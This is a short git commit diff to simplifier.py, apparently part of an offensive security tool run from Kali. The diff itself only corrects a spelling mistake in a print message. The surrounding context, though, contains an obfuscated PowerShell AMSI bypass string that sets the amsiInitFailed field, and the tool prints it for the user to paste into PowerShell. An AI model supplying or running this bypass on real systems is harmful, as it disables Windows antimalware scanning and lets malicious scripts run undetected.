7d266b1af669bfaf356d2a5713204c6a29ea7672
root <root@kali>
2020-05-15 16:30:45 +0300

    Blog Set Up

--- simplifier.py
+++ simplifier.py
@@ -393,7 +393,7 @@ def aes():
 
 def amsi():
     string = """sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )"""
-    print(Fore.RED+"Past this string into powershell: \n\n"+Fore.GREEN +string+"\n")
+    print(Fore.RED+"Paste this string into powershell: \n\n"+Fore.GREEN +string+"\n")
 
 script_pt = script_path()
 current_path = get_path()
